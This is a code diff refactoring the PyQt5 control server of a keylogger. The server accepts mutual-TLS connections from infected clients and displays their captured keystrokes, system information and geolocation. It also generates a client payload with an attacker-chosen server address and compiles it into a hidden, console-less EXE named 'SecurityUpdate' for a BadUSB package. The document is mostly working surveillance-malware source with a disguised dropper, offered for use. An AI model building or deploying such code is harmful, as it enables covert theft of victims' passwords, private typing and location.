@@ -1,473 +1,776 @@
-import sys
+import os
+import shutil
 import socket
 import ssl
+import subprocess
+import sys
 import threading
-import os
-from tabnanny import check
+from contextlib import contextmanager
+from dataclasses import dataclass
+from datetime import datetime
+from typing import Dict, Optional
 
-from IPython.utils.capture import capture_output
-from PyQt5.QtWidgets import QApplication, QMainWindow,QPushButton, QTextEdit, QVBoxLayout, QWidget, QLabel, QPlainTextEdit, QMessageBox, QLineEdit
-from PyQt5.QtCore import pyqtSignal, QObject
+from PyQt5.QtCore import pyqtSignal, QObject, QThread
+from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox, QProgressDialog, QFileDialog
 
 from config_manager import get_config_manager
-
-
 from gui.controllers.Dashboard import Ui_MainWindow
 from gui.controllers.PrepareClientPayload import Ui_PrepareClientPayload
 from gui.controllers.SetEmailInfo import Ui_SetEmaiInfo
 
 
-class Worker(QObject):
-    keylog_signal: pyqtSignal = pyqtSignal(str)
-    computer_info_signal: pyqtSignal = pyqtSignal(str)
-    geo_location_signal: pyqtSignal = pyqtSignal(str)
-    client_connected_signal: pyqtSignal = pyqtSignal(str)
-    client_disconnected_signal: pyqtSignal = pyqtSignal()
+@dataclass
+class ClientInfo:
+    """Immutable client information"""
+    socket: socket.socket
+    address: tuple
+    client_id: str
+    common_name: Optional[str] = None
 
-    def __init__(self, ui):
-        super().__init__()
-        self.ui = ui
-        self.client_socket = None
-        self.client_id = None
-
-        # SSL Configuration
-        self.ssl_context = self.create_ssl_context()
-
-        #Get Configuration manager
-        self.config = get_config_manager()
+    def __str__(self):
+        return f"{self.address[0]}:{self.address[1]}" + (
+            f" ({self.common_name})" if self.common_name else ""
+        )
 
 
+@dataclass
+class ServerConfig:
+    """Server configuration settings"""
+    host: str = '0.0.0.0'
+    port: int = 10000
+    max_clients: int = 1
+    cert_dir: str = 'certs'
 
-    def create_ssl_context(self):
-        """Create SSL context with mTLS (mutual TLS) authentication"""
+    @property
+    def server_cert(self) -> str:
+        return os.path.join(self.cert_dir, 'server_cert.pem')
+
+    @property
+    def server_key(self) -> str:
+        return os.path.join(self.cert_dir, 'server_key.pem')
+
+    @property
+    def ca_cert(self) -> str:
+        return os.path.join(self.cert_dir, 'ca_cert.pem')
+
+    @property
+    def crl_file(self) -> str:
+        return os.path.join(self.cert_dir, 'crl.pem')
+
+
+
+
+class SSLContextManager:
+    """Manages SSL/TLS context creation and validation"""
+
+    def __init__(self, config: ServerConfig):
+        self.config = config
+        self._context: Optional[ssl.SSLContext] = None
+
+    def create_context(self) -> ssl.SSLContext:
+        """Create and configure SSL context with mTLS"""
+        if self._context:
+            return self._context
+
         try:
-            # Create SSL context for server
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
 
-            # Load server certificate and private key
+            # Load certificates
             context.load_cert_chain(
-                certfile="certs/server_cert.pem",
-                keyfile="certs/server_key.pem"
+                certfile=self.config.server_cert,
+                keyfile=self.config.server_key
             )
 
             # Require client certificate (mutual TLS)
             context.verify_mode = ssl.CERT_REQUIRED
+            context.load_verify_locations(cafile=self.config.ca_cert)
 
-            # Load CA certificate to verify client certificates
-            context.load_verify_locations(cafile="certs/ca_cert.pem")
+            # Load CRL if available
+            if os.path.exists(self.config.crl_file):
+                context.load_verify_locations(cafile=self.config.crl_file)
+                context.verify_flags = ssl.VERIFY_CRL_CHECK_LEAF
 
-            # Load Certificate Revocation List (CRL)
-            context.load_verify_locations(cafile="certs/crl.pem")
-            context.verify_flags = ssl.VERIFY_CRL_CHECK_LEAF
+            # Strong cipher suites
+            context.set_ciphers(
+                'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:'
+                '!aNULL:!MD5:!DSS'
+            )
 
-            # Set strong cipher suites
-            context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
-
-            # Disable older SSL/TLS versions
+            # Minimum TLS 1.2
             context.minimum_version = ssl.TLSVersion.TLSv1_2
 
-            print("[+] SSL context created successfully")
-            print("    - Server certificate: certs/server_cert.pem")
-            print("    - CA certificate: certs/ca_cert.pem")
-            print("    - CRL enabled: certs/crl.pem")
-            print("    - Client authentication: REQUIRED")
-
+            self._context = context
+            self._log_context_info()
             return context
 
         except FileNotFoundError as e:
-            print(f"[!] Certificate file not found: {e}")
-            print("[!] Please run generate_certificates.py first!")
-            sys.exit(1)
+            raise RuntimeError(
+                f"Certificate file not found: {e}\n"
+                "Please run generate_certificates.py first!"
+            )
         except Exception as e:
-            print(f"[!] Error creating SSL context: {e}")
-            sys.exit(1)
+            raise RuntimeError(f"Error creating SSL context: {e}")
+
+    def _log_context_info(self):
+        """Log SSL context configuration"""
+        print("[+] SSL context created successfully")
+        print(f"    - Server cert: {self.config.server_cert}")
+        print(f"    - CA cert: {self.config.ca_cert}")
+        print(f"    - CRL: {'enabled' if os.path.exists(self.config.crl_file) else 'disabled'}")
+        print("    - Client auth: REQUIRED")
+
+
+
+
+class ClientManager:
+    """Manages client connections with thread-safe operations"""
+
+    def __init__(self, max_clients: int = 1):
+        self.max_clients = max_clients
+        self._clients: Dict[str, ClientInfo] = {}
+        self._lock = threading.Lock()
+
+    def can_accept_client(self) -> bool:
+        """Check if server can accept more clients"""
+        with self._lock:
+            return len(self._clients) < self.max_clients
+
+    def add_client(self, client_info: ClientInfo) -> bool:
+        """Add client if space available"""
+        with self._lock:
+            if len(self._clients) >= self.max_clients:
+                return False
+            self._clients[client_info.client_id] = client_info
+            return True
+
+    def remove_client(self, client_id: str) -> Optional[ClientInfo]:
+        """Remove and return client info"""
+        with self._lock:
+            return self._clients.pop(client_id, None)
+
+    def get_client(self, client_id: str) -> Optional[ClientInfo]:
+        """Get client info"""
+        with self._lock:
+            return self._clients.get(client_id)
+
+    @contextmanager
+    def get_clients_snapshot(self):
+        """Thread-safe iteration over clients"""
+        with self._lock:
+            snapshot = list(self._clients.items())
+        yield snapshot
+
+
+
+
+class Worker(QObject):
+    """Handles server operations in background thread"""
+
+    # Signals
+    keylog_signal = pyqtSignal(str, str)  # (client_id, data)
+    computer_info_signal = pyqtSignal(str, str)
+    geo_location_signal = pyqtSignal(str, str)
+    client_connected_signal = pyqtSignal(str)
+    client_disconnected_signal = pyqtSignal(str)
+    error_signal = pyqtSignal(str)
+
+    def __init__(self, config: ServerConfig):
+        super().__init__()
+        self.config = config
+        self.ssl_manager = SSLContextManager(config)
+        self.client_manager = ClientManager(config.max_clients)
+        self._running = False
 
     def start_server(self):
-        # Create raw socket
-        bindsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        bindsocket.bind(('0.0.0.0', 10000))
-        bindsocket.listen(1)  # Only accept 1 client
-        print("[*] Server listening on port 10000 (SSL/TLS enabled)")
-        print("[*] Waiting for client connection...")
+        """Start listening for client connections"""
+        self._running = True
 
-        while True:
-            try:
-                # Accept raw connection
-                raw_socket, fromaddr = bindsocket.accept()
-                print(f"[*] Raw connection from {fromaddr}, initiating SSL handshake...")
-
-                # Check if we already have a client connected
-                if self.client_socket is not None:
-                    print(f"[-] Connection rejected: Client already connected")
-                    raw_socket.close()
-                    continue
-
-                try:
-                    # Wrap socket with SSL
-                    newsocket = self.ssl_context.wrap_socket(raw_socket, server_side=True)
-
-                    # Get client certificate info
-                    client_cert = newsocket.getpeercert()
-                    client_cn = None
-                    if client_cert:
-                        for subject in client_cert.get('subject', []):
-                            for key, value in subject:
-                                if key == 'commonName':
-                                    client_cn = value
-                                    break
-
-                    client_id = f"{fromaddr[0]}:{fromaddr[1]}"
-                    if client_cn:
-                        client_id += f" ({client_cn})"
-
-                    print(f"[+] SSL handshake successful!")
-                    print(f"    - Client: {client_id}")
-                    print(f"    - Cipher: {newsocket.cipher()}")
-                    print(f"    - TLS Version: {newsocket.version()}")
-
-                except ssl.SSLError as e:
-                    print(f"[!] SSL handshake failed from {fromaddr}: {e}")
-                    raw_socket.close()
-                    continue
-                except Exception as e:
-                    print(f"[!] Error during SSL handshake from {fromaddr}: {e}")
-                    raw_socket.close()
-                    continue
-
-                self.client_socket = newsocket
-                self.client_id = client_id
-                print(f"[+] Client authenticated and connected")
-
-                # Emit signal that client is connected
-                self.client_connected_signal.emit(client_id)
-
-                # Handle this client
-                client_thread = threading.Thread(target=self.handle_client, args=(newsocket,), daemon=True)
-                client_thread.start()
-
-            except Exception as e:
-                print(f"[!] Error accepting client connection: {e}")
-
-    def handle_client(self, client_socket):
         try:
-            while True:
+            ssl_context = self.ssl_manager.create_context()
+        except RuntimeError as e:
+            self.error_signal.emit(str(e))
+            return
+
+        # Create and bind socket
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as bind_socket:
+            bind_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            bind_socket.bind((self.config.host, self.config.port))
+            bind_socket.listen(5)
+
+            print(f"[*] Server listening on {self.config.host}:{self.config.port}")
+            print("[*] Waiting for client connections...")
+
+            while self._running:
                 try:
-                    data = client_socket.recv(4096).decode()
+                    self._accept_client(bind_socket, ssl_context)
                 except Exception as e:
-                    print(f"[!] Error decoding data from client: {e}")
-                    break
+                    print(f"[!] Error in accept loop: {e}")
 
-                if data:
-                    print(f"[+] Data from client: {data.strip()}")
-                    self.handle_received_data(data.strip())
-                else:
-                    break
+    def _accept_client(self, bind_socket: socket.socket, ssl_context: ssl.SSLContext):
+        """Accept and process a single client connection"""
+        raw_socket, address = bind_socket.accept()
+
+        # Check capacity
+        if not self.client_manager.can_accept_client():
+            print(f"[-] Connection rejected from {address}: Server full")
+            raw_socket.close()
+            return
+
+        print(f"[*] Raw connection from {address}, initiating SSL handshake...")
+
+        # Wrap with SSL
+        try:
+            ssl_socket = ssl_context.wrap_socket(raw_socket, server_side=True)
+            client_info = self._extract_client_info(ssl_socket, address)
+        except ssl.SSLError as e:
+            print(f"[!] SSL handshake failed from {address}: {e}")
+            raw_socket.close()
+            return
         except Exception as e:
-            print(f"[!] Error handling data from client: {e}")
-        finally:
-            self.client_socket = None
-            self.client_id = None
-            print(f"[-] Client disconnected")
-            self.client_disconnected_signal.emit()
+            print(f"[!] Error during SSL handshake from {address}: {e}")
+            raw_socket.close()
+            return
 
-    def handle_received_data(self, data):
-        if "KEYLOG" in data:
-            # Remove "KEYLOG: " prefix and emit
-            log_data = data.replace("KEYLOG: ", "")
-            print(f"[Worker] Emitting keylog")
-            self.keylog_signal.emit(log_data)
-        elif "COMPUTER_INFO" in data:
-            # Remove "COMPUTER_INFO: " prefix and emit
-            info_data = data.replace("COMPUTER_INFO: ", "")
-            print(f"[Worker] Emitting computer info")
-            self.computer_info_signal.emit(info_data)
-        elif "GEO_LOCATION" in data:
-            # Remove "GEO_LOCATION: " prefix and emit
-            geo_data = data.replace("GEO_LOCATION: ", "")
-            print(f"[Worker] Emitting geo-location")
-            self.geo_location_signal.emit(geo_data)
+        # Add to manager
+        if not self.client_manager.add_client(client_info):
+            print(f"[-] Could not add client {client_info}")
+            ssl_socket.close()
+            return
+
+        print(f"[+] Client authenticated: {client_info}")
+        self.client_connected_signal.emit(client_info.client_id)
+
+        # Handle in separate thread
+        thread = threading.Thread(
+            target=self._handle_client,
+            args=(client_info,),
+            daemon=True
+        )
+        thread.start()
+
+    def _extract_client_info(self, ssl_socket: socket.socket, address: tuple) -> ClientInfo:
+        """Extract client information from SSL socket"""
+        common_name = None
+        cert = ssl_socket.getpeercert()
+
+        if cert:
+            for subject in cert.get('subject', []):
+                for key, value in subject:
+                    if key == 'commonName':
+                        common_name = value
+                        break
+
+        client_id = f"{address[0]}:{address[1]}"
+
+        print(f"[+] SSL handshake successful!")
+        print(f"    - Cipher: {ssl_socket.cipher()}")
+        print(f"    - TLS Version: {ssl_socket.version()}")
+
+        return ClientInfo(
+            socket=ssl_socket,
+            address=address,
+            client_id=client_id,
+            common_name=common_name
+        )
+
+    def _handle_client(self, client_info: ClientInfo):
+        """Handle data from connected client"""
+        try:
+            buffer = ""
+            while self._running:
+                try:
+                    data = client_info.socket.recv(4096).decode('utf-8', errors='ignore')
+                    if not data:
+                        break
+
+                    buffer += data
+                    # Process complete messages (assuming newline-delimited)
+                    while '\n' in buffer:
+                        line, buffer = buffer.split('\n', 1)
+                        self._process_message(client_info.client_id, line.strip())
+
+                except UnicodeDecodeError as e:
+                    print(f"[!] Decode error from {client_info.client_id}: {e}")
+                    continue
+                except Exception as e:
+                    print(f"[!] Error receiving from {client_info.client_id}: {e}")
+                    break
+
+        finally:
+            self._disconnect_client(client_info)
+
+    def _process_message(self, client_id: str, data: str):
+        """Process received message and emit appropriate signal"""
+        if not data:
+            return
+
+        print(f"[+] Data from {client_id}: {data[:100]}...")
+
+        if data.startswith("KEYLOG:"):
+            self.keylog_signal.emit(client_id, data[7:].strip())
+        elif data.startswith("COMPUTER_INFO:"):
+            formatted = data[15:].strip().replace(" | ", "\n")
+            self.computer_info_signal.emit(client_id, formatted)
+
+        elif data.startswith("GEO_LOCATION:"):
+            formatted = data[13:].strip().replace(" | ", "\n")
+            self.geo_location_signal.emit(client_id, formatted)
+
         else:
-            print(f"[!] Unknown data type: {data}")
+            print(f"[!] Unknown message type: {data[:50]}")
+
+    def _disconnect_client(self, client_info: ClientInfo):
+        """Clean up disconnected client"""
+        try:
+            client_info.socket.close()
+        except:
+            pass
+
+        self.client_manager.remove_client(client_info.client_id)
+        print(f"[-] Client disconnected: {client_info.client_id}")
+        self.client_disconnected_signal.emit(client_info.client_id)
+
+    def stop(self):
+        """Stop the server"""
+        self._running = False
+
+
+
+
+class CompilerThread(QThread):
+    """Handle PyInstaller compilation in background"""
+
+    progress = pyqtSignal(str)
+    finished = pyqtSignal(bool, str, str)  # (success, output_path, error)
+
+    def __init__(self, export_dir: str):
+        super().__init__()
+        self.export_dir = export_dir
+
+    def run(self):
+        """Execute compilation process"""
+        try:
+            self.progress.emit("Starting compilation...")
+
+            separator = ";" if os.name == "nt" else ":"
+
+            compile_cmd = [
+                "pyinstaller",
+                "--onefile",
+                "--noconsole",
+                "--add-data", f"certs{separator}certs",
+                "--name", "SecurityUpdate",
+                "--clean",
+                "--noconfirm",
+                "program_payload.py"
+            ]
+
+            self.progress.emit("Running PyInstaller (1-2 minutes)...")
+
+            result = subprocess.run(
+                compile_cmd,
+                capture_output=True,
+                text=True,
+                timeout=300
+            )
+
+            if result.returncode != 0:
+                self.finished.emit(False, "", result.stderr)
+                return
+
+            self.progress.emit("Compilation complete. Copying files...")
+
+            exe_source = os.path.join("dist", "SecurityUpdate.exe")
+            if not os.path.exists(exe_source):
+                self.finished.emit(False, "", "EXE not found after compilation")
+                return
+
+            exe_dest = os.path.join(self.export_dir, "SecurityUpdate.exe")
+            shutil.copy(exe_source, exe_dest)
+
+            self.finished.emit(True, self.export_dir, "")
+
+        except subprocess.TimeoutExpired:
+            self.finished.emit(False, "", "Compilation timeout (5 minutes)")
+        except Exception as e:
+            self.finished.emit(False, "", str(e))
+
+
 
 
 class MainWindow(QMainWindow):
+    """Main application window"""
+
     def __init__(self):
         super().__init__()
+
+        # Configuration
+        self.config = ServerConfig()
+        self.app_config = get_config_manager()
+
+        # Setup UI
         self.ui = Ui_MainWindow()
         self.ui.setupUi(self)
-        self.ui.ComputerSelection.hide()
-        self.setup_client_display()
-        self.config = get_config_manager()
+        self._setup_displays()
+        self._connect_signals()
 
+        # Start server
+        self._start_server()
 
-        # Connect UI buttons
-        self.ui.PrepareClientPayload.clicked.connect(self.open_generate_payload_window)
-        self.ui.actionSet_Email_Info.triggered.connect(self.open_set_email_info_window)
-        self.ui.RefreshButton.clicked.connect(self.refresh_logs)
-        self.ui.actionLight_Mode.triggered.connect(self.set_light_mode)
-        self.ui.actionDark_Mode.triggered.connect(self.set_dark_mode)
-
-
-
-        # Start server listener
-        self.start_server_listener()
-
-    def setup_client_display(self):
-        """Setup text display areas for the single client"""
-        # Based on Dashboard.py, the widgets are:
-        # - plainTextEdit: Computer Information
-        # - plainTextEdit_2: Geo-Location Information
-        # - plainTextEdit_3: Key Logs
-
+    def _setup_displays(self):
+        """Configure display widgets"""
         self.computer_info_display = self.ui.plainTextEdit
         self.geo_location_display = self.ui.plainTextEdit_2
         self.keylog_display = self.ui.plainTextEdit_3
 
-        # Set placeholder text
-        self.keylog_display.setPlaceholderText("Waiting for client connection...")
-        self.computer_info_display.setPlaceholderText("No computer information yet")
-        self.geo_location_display.setPlaceholderText("No geo-location data yet")
+        self.keylog_display.setPlaceholderText("Waiting for client...")
+        self.computer_info_display.setPlaceholderText("No computer info")
+        self.geo_location_display.setPlaceholderText("No geo-location data")
 
-        print("[+] Display widgets configured:")
-        print("    - Computer Info: plainTextEdit")
-        print("    - Geo-Location: plainTextEdit_2")
-        print("    - Key Logs: plainTextEdit_3")
+    def _connect_signals(self):
+        """Connect UI signals to slots"""
+        self.ui.PrepareClientPayload.clicked.connect(self._open_payload_window)
+        self.ui.ExportForBadUSB.clicked.connect(self._export_badusb)
+        self.ui.actionSet_Email_Info.triggered.connect(self._open_email_info)
+        self.ui.RefreshButton.clicked.connect(self._refresh_logs)
+        self.ui.actionLight_Mode.triggered.connect(lambda: self._set_theme("light"))
+        self.ui.actionDark_Mode.triggered.connect(lambda: self._set_theme("dark"))
+        self.ui.actionGenerate_Certificates.triggered.connect(self._generate_certificates)
+        self.ui.actionRevoke_Certificate.triggered.connect(self._revoke_certificate)
 
-    def open_generate_payload_window(self):
-        print("[DEBUG Button clicked - opening paylkoad window...")
+    def _generate_certificates(self):
+        """Generate SSL certificates"""
+        subprocess.run(["python", "generate_certificates.py"])
+        print("[*] Certificates generated")
 
-        try:
-            print("[DEBUG] Creating QMainWindow...")
-            self.child_window1 = QMainWindow()
+    def _revoke_certificate(self):
+        """Revoke a client certificate"""
+        from PyQt5.QtWidgets import QInputDialog
 
-            print("[DEBUG] Creating UI_prepareclientpayload...")
-            self.child_ui1 = Ui_PrepareClientPayload()
+        # Get list of client certificates
+        if os.path.exists("certs"):
+            cert_files = [f.replace("_cert.pem", "") for f in os.listdir("certs")
+                          if f.endswith("_cert.pem")
+                          and not f.startswith("server")
+                          and not f.startswith("ca")]
 
-            print("[DEBUG] Setting up UI...")
-            self.child_ui1.setupUi(self.child_window1)
-
-            print("[DEBUG] Loading Server Settings...")
-            server_settings = self.config.get_server_settings()
-            print(f"[DEBUG] Server settings: {server_settings}")
-
-            print("[DEBUG] Settings text fields...")
-            self.child_ui1.lineEdit.setText(server_settings["server_ip"])
-            self.child_ui1.lineEdit.setPlaceholderText("e.g., 192.168.1.100 or yourdomain.com")
-            self.child_ui1.lineEdit_2.setText(str(server_settings["server_port"]))
-            self.child_ui1.lineEdit_2.setPlaceholderText("Default: 10000")
-
-            print("[DEBUG] Connecting button...")
-            self.child_ui1.pushButton.clicked.connect(self.generate_client_payload)
-
-            print("[DEBUG] Showing window...")
-            self.child_window1.show()
-
-            print("[DEBUG] Window should be visible now")
-
-        except Exception as e:
-            print(f"[!] Error opening payload window: {e}")
-            import traceback
-            traceback.print_exc()
-
-    def generate_client_payload(self):
-        server_ip = self.child_ui1.lineEdit.text().strip()
-        server_port = self.child_ui1.lineEdit_2.text().strip()
-
-        if not server_ip:
-            QMessageBox.warning(
-                self.child_window1,
-                "Validation Error",
-                "Server IP Address is required!"
-            )
-            return
-
-        if not server_port:
-            server_port = "10000"
-
-        try:
-            port_int = int(server_port)
-            if port_int < 1 or port_int > 65535:
-                raise ValueError()
-        except ValueError:
-            QMessageBox.warning(
-                self.child_window1,
-                "Validation Error",
-                "Server port must be a number between 1 and 65535!"
-            )
-            return
-
-        client_name = "client1"
-
-        if not self.config.set_server_settings(server_ip, server_port, client_name):
-            QMessageBox.critical(
-                self.child_window1,
-                "Error",
-                "failed to save server settings."
-            )
-            return
-
-        try:
-            with open("program.py", "r") as f:
-                program_code = f.read()
-        except FileNotFoundError:
-            QMessageBox.critical(
-                self.child_window1,
-                "Error",
-                "program.py not found! Make sure it's in the same directory."
-            )
-            return
-
-        modified_code = program_code.replace(
-            'SSL_SERVER_HOST = "127.0.0.1"',
-            f'SSL_SERVER_HOST = "{server_ip}"'
-        ).replace(
-            'SSL_SERVER_PORT = 10000',
-            f'SSL_SERVER_PORT = {server_port}'
-        )
-
-        output_file = "program_payload.py"
-        try:
-            with open(output_file, "w") as f:
-                f.write(modified_code)
-
-            QMessageBox.information(
-                self.child_window1,
-                "Success",
-                f"Client payload generated successfully!\n\n"
-                f"File: {output_file}\n"
-                f"Server IP: {server_ip}\n"
-                f"Server Port: {server_port}\n\n"
-                f"This file is ready to deploy on the target machine.\n"
-                f"Don't forget to include the certs folder!"
-            )
-
-            print(f"[+] Client payload generated: {output_file}")
-            print(f"    - Server IP: {server_ip}")
-            print(f"    - Server Port: {server_port}")
-
-        except Exception as e:
-            QMessageBox.critical(
-                self.child_window1,
-                "Error",
-                f"Failed to write payload file: {e}"
-            )
-            return
-
-
-    def export_for_badusb(self):
-        import subprocess
-        import shutil
-        import datetime import datetime
-
-        try:
-            subprocess.run(["pyinstaller", "--version"],
-                           capture_output=True, check=True)
-        except:
-            QMessageBox.information(
-                self,
-                "Installing",
-                "Installing PyInstaller...")
-
-            result = subprocess.run(["pip", "install", "pyinstaller"],
-                                    capture_output=True)
-
-            if result.returncode != 0:
-                QMessageBox.critical(
-                    self,
-                    "Error",
-                    "Failed to install PyInstaller"
+            if cert_files:
+                client_name, ok = QInputDialog.getItem(
+                    self, "Revoke Certificate",
+                    "Select client:",
+                    cert_files,
+                    0,
+                    False
                 )
-                return
 
+                if ok:
+                    subprocess.run(["python", "revoke_certificates.py", "revoke", client_name])
+                    print(f"[*] Certificate revoked: {client_name}")
 
-
-
-
-
-
-
-    def open_set_email_info_window(self):
-        self.child_window2 = QMainWindow()
-        self.child_ui2 = Ui_SetEmaiInfo()
-        self.child_ui2.setupUi(self.child_window2)
-        self.child_window2.show()
-
-    def refresh_logs(self):
-        print("[*] Refreshing logs...")
-        # Clear all displays
-        if hasattr(self, 'keylog_display') and self.keylog_display:
-            self.keylog_display.clear()
-            self.keylog_display.setPlaceholderText("Logs cleared")
-        if hasattr(self, 'computer_info_display') and self.computer_info_display:
-            self.computer_info_display.clear()
-            self.computer_info_display.setPlaceholderText("No computer information yet")
-        if hasattr(self, 'geo_location_display') and self.geo_location_display:
-            self.geo_location_display.clear()
-            self.geo_location_display.setPlaceholderText("No geo-location data yet")
-
-    def set_light_mode(self):
-        self.setStyleSheet("background-color: white; color: black;")
-        print("[*] Switched to light mode.")
-
-    def set_dark_mode(self):
-        self.setStyleSheet("background-color: #2E2E2E; color: white;")
-        print("[*] Switched to dark mode.")
-
-    def start_server_listener(self):
-        self.worker = Worker(self.ui)
-        self.worker.keylog_signal.connect(self.update_keylog)
-        self.worker.computer_info_signal.connect(self.update_computer_info)
-        self.worker.geo_location_signal.connect(self.update_geo_location)
-        self.worker.client_connected_signal.connect(self.on_client_connected)
-        self.worker.client_disconnected_signal.connect(self.on_client_disconnected)
+    def _start_server(self):
+        """Initialize and start server worker"""
+        self.worker = Worker(self.config)
+        self.worker.keylog_signal.connect(self._update_keylog)
+        self.worker.computer_info_signal.connect(self._update_computer_info)
+        self.worker.geo_location_signal.connect(self._update_geo_location)
+        self.worker.client_connected_signal.connect(self._on_client_connected)
+        self.worker.client_disconnected_signal.connect(self._on_client_disconnected)
+        self.worker.error_signal.connect(self._on_server_error)
 
         thread = threading.Thread(target=self.worker.start_server, daemon=True)
         thread.start()
 
-    def on_client_connected(self, client_id):
-        """Called when a client connects"""
+    # Signal Handlers
+
+    def _on_client_connected(self, client_id: str):
+        """Handle client connection"""
         print(f"[MainWindow] Client connected: {client_id}")
-        self.setWindowTitle(f"Keylogger Server - Client Connected: {client_id}")
+        self.setWindowTitle(f"Keylogger Server - Connected: {client_id}")
+        self.keylog_display.setPlaceholderText(f"Connected: {client_id}")
 
-        if hasattr(self, 'keylog_display') and self.keylog_display:
-            self.keylog_display.setPlaceholderText(f"Connected to: {client_id}")
+    def _on_client_disconnected(self, client_id: str):
+        """Handle client disconnection"""
+        print(f"[MainWindow] Client disconnected: {client_id}")
+        self.setWindowTitle("Keylogger Server - No Client")
+        self.keylog_display.appendPlainText("\n--- Client Disconnected ---\n")
 
-    def on_client_disconnected(self):
-        """Called when the client disconnects"""
-        print(f"[MainWindow] Client disconnected")
-        self.setWindowTitle("Keylogger Server - No Client Connected")
+    def _on_server_error(self, error: str):
+        """Handle server errors"""
+        QMessageBox.critical(self, "Server Error", error)
 
-        if hasattr(self, 'keylog_display') and self.keylog_display:
-            self.keylog_display.appendPlainText("\n--- Client Disconnected ---\n")
-
-    def update_keylog(self, log_line):
+    def _update_keylog(self, client_id: str, data: str):
         """Update keylog display"""
-        print(f"[MainWindow] Updating keylog")
-        if hasattr(self, 'keylog_display') and self.keylog_display:
-            self.keylog_display.appendPlainText(log_line)
-        else:
-            print(f"[!] Keylog display not available: {log_line}")
+        self.keylog_display.appendPlainText(data)
 
-    def update_computer_info(self, info):
-        """Update computer information display"""
-        print(f"[MainWindow] Updating computer info")
-        if hasattr(self, 'computer_info_display') and self.computer_info_display:
-            self.computer_info_display.setPlainText(info)
-        else:
-            print(f"[!] Computer info display not available: {info}")
+    def _update_computer_info(self, client_id: str, data: str):
+        """Update computer info display"""
+        self.computer_info_display.setPlainText(data.strip())
 
-    def update_geo_location(self, location):
+    def _update_geo_location(self, client_id: str, data: str):
         """Update geo-location display"""
-        print(f"[MainWindow] Updating geo location")
-        if hasattr(self, 'geo_location_display') and self.geo_location_display:
-            self.geo_location_display.setPlainText(location)
+        self.geo_location_display.setPlainText(data)
+
+    # UI Actions
+
+    def _open_payload_window(self):
+        """Open payload generation window"""
+        try:
+            self.payload_window = QMainWindow()
+            self.payload_ui = Ui_PrepareClientPayload()
+            self.payload_ui.setupUi(self.payload_window)
+
+            # Load saved settings
+            settings = self.app_config.get_server_settings()
+            self.payload_ui.lineEdit.setText(settings.get("server_ip", ""))
+            self.payload_ui.lineEdit_2.setText(str(settings.get("server_port", 10000)))
+
+            self.payload_ui.pushButton.clicked.connect(self._generate_payload)
+            self.payload_window.show()
+
+        except Exception as e:
+            QMessageBox.critical(self, "Error", f"Could not open window: {e}")
+
+    def _generate_payload(self):
+        """Generate client payload with server settings"""
+        server_ip = self.payload_ui.lineEdit.text().strip()
+        server_port = self.payload_ui.lineEdit_2.text().strip()
+
+        # Validation
+        if not server_ip:
+            QMessageBox.warning(self.payload_window, "Error", "Server IP required")
+            return
+
+        try:
+            port = int(server_port) if server_port else 10000
+            if not 1 <= port <= 65535:
+                raise ValueError()
+        except ValueError:
+            QMessageBox.warning(self.payload_window, "Error", "Invalid port")
+            return
+
+        # Generate payload
+        try:
+            with open("program.py", "r") as f:
+                code = f.read()
+
+            modified = code.replace(
+                'SSL_SERVER_HOST = "127.0.0.1"',
+                f'SSL_SERVER_HOST = "{server_ip}"'
+            ).replace(
+                'SSL_SERVER_PORT = 10000',
+                f'SSL_SERVER_PORT = {port}'
+            )
+
+            with open("program_payload.py", "w") as f:
+                f.write(modified)
+
+            # Save config
+            self.app_config.set_server_settings(server_ip, str(port), "client1")
+
+            QMessageBox.information(
+                self.payload_window,
+                "Success",
+                f"Payload generated!\n\n"
+                f"File: program_payload.py\n"
+                f"Server: {server_ip}:{port}"
+            )
+
+        except Exception as e:
+            QMessageBox.critical(self.payload_window, "Error", str(e))
+
+    def _export_badusb(self):
+        """Export BadUSB package with compiled EXE"""
+        # Validation checks
+        if not os.path.exists("program_payload.py"):
+            QMessageBox.warning(
+                self, "Error",
+                "Generate payload first!\n\nClick 'Generate Payload'"
+            )
+            return
+
+        if not os.path.exists("certs"):
+            QMessageBox.critical(self, "Error", "Certs folder missing!")
+            return
+
+        # Check PyInstaller
+        try:
+            subprocess.run(
+                ["pyinstaller", "--version"],
+                capture_output=True,
+                check=True,
+                timeout=5
+            )
+        except:
+            reply = QMessageBox.question(
+                self, "Install PyInstaller?",
+                "PyInstaller required. Install now?",
+                QMessageBox.Yes | QMessageBox.No
+            )
+            if reply == QMessageBox.No:
+                return
+
+            result = subprocess.run(
+                ["pip", "install", "pyinstaller"],
+                capture_output=True
+            )
+            if result.returncode != 0:
+                QMessageBox.critical(self, "Error", "Installation failed")
+                return
+        #Ask user to choose save location
+        save_directory = QFileDialog.getExistingDirectory(
+            self,
+            "Select Folder to save BadUSB package",
+            os.path.expanduser("~"),
+            QFileDialog.ShowDirsOnly | QFileDialog.DontResolveSymlinks
+        )
+        if not save_directory:
+            return
+
+
+
+        # Confirm compilation
+        reply = QMessageBox.question(
+            self, "Compile",
+            "Ready to compile (1-2 minutes).\n\nContinue?",
+            QMessageBox.Yes | QMessageBox.No
+        )
+        if reply == QMessageBox.No:
+            return
+
+        #Create export directory with timestamp
+        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        folder_name = f"BadUSB_Package_{timestamp}"
+        export_dir = os.path.join(save_directory, folder_name)
+        os.makedirs(export_dir, exist_ok=True)
+
+        #Show progress dialog
+        progress = QProgressDialog("Compiling...", "Cancel", 0, 0, self)
+        progress.setWindowModality(2)
+        progress.show()
+
+        #Start Compilation Thread
+        self.compiler_thread = CompilerThread(export_dir)
+        self.compiler_thread.progress.connect(progress.setLabelText)
+        self.compiler_thread.finished.connect(
+            lambda success, path, error: self._on_compile_finished(
+                success, path, error, progress, export_dir
+            )
+        )
+        self.compiler_thread.start()
+
+
+    def _on_compile_finished(self, success, path, error, progress, export_dir):
+        """Handle compilation completion"""
+        progress.close()
+
+        if not success:
+            QMessageBox.critical(self, "Failed", f"Compilation error:\n{error}")
+            return
+
